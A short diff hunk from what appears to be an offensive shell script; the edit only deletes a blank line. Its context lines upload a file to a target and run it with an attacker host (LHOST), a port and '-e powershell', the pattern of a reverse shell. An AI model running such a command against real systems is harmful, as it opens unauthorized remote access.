@@ -20,6 +20,5 @@ EXECUTE_COMMAND="powershell"
 
 cmd_upload_file "${LOCATION}" "${FILE}"
 
-
 execute_command "${FILE_LOCATION} ${LHOST} ${PORT} -e ${EXECUTE_COMMAND}"
 create_new_line
